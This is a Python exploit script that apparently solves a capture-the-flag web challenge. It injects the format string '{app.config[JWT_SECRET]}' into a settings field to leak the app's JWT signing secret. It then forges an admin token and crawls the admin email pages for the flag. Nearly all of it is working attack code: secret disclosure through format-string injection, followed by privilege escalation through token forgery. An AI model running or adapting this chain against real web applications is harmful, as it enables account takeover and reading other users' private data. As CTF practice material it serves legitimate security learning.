#!/usr/bin/env python3
import requests
import jwt
from datetime import datetime, timedelta  # Don't import timezone
import re
import random
import string

BASE_URL = "http://challenges.1pc.tf:33344"

username = f"user_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
email = f"{username}@corpmail.local"

print(f"[*] Credentials: {username} / {password}\n")

session = requests.Session()

# Register
print("[*] Registering...")
session.post(f"{BASE_URL}/register", data={
    'username': username,
    'email': email,
    'password': password,
    'confirm_password': password
})

# Login
print("[*] Logging in...")
session.post(f"{BASE_URL}/login", data={'username': username, 'password': password})

# Exploit
print("[*] Exploiting format string injection...")
session.post(f"{BASE_URL}/settings", data={'signature': '{app.config[JWT_SECRET]}'})

# Get secret
response = session.get(f"{BASE_URL}/settings")
match = re.search(r'<textarea[^>]*name="signature"[^>]*>([^<]+)</textarea>', response.text, re.DOTALL)
jwt_secret = match.group(1).strip()
print(f"[+] JWT Secret: {jwt_secret}\n")

# Forge admin token - USE EXACT SAME FORMAT AS auth.py
print("[*] Forging admin JWT token...")
admin_token = jwt.encode({
    'user_id': 1,
    'username': 'admin',
    'is_admin': 1,
    'exp': datetime.utcnow() + timedelta(hours=24)  # ← MATCH auth.py format!
}, jwt_secret, algorithm='HS256')

session.cookies.set('token', admin_token)

# Get flag
print("[*] Searching for the flag...\n")

for user_id in [4, 3, 5, 2, 1]:
    print(f"[*] Checking user_id {user_id}...")
    response = session.get(f"{BASE_URL}/admin/user/{user_id}/emails")
    
    if response.status_code != 200:
        print(f"    Status: {response.status_code}")
        continue
    
    print(f"    Status: 200 ✓")
    
    flag = re.search(r'C2C\{[^}]+\}', response.text)
    if flag:
        print(f"\n{'='*60}")
        print(f"FLAG: {flag.group(0)}")
        print(f"{'='*60}\n")
        exit(0)
    
    email_ids = re.findall(r'href=["\']?/admin/email/(\d+)["\']?', response.text)
    for email_id in email_ids:
        email_response = session.get(f"{BASE_URL}/admin/email/{email_id}")
        flag = re.search(r'C2C\{[^}]+\}', email_response.text)
        if flag:
            print(f"\n{'='*60}")
            print(f"FLAG: {flag.group(0)}")
            print(f"{'='*60}\n")
            exit(0)

print("[!] Flag not found")
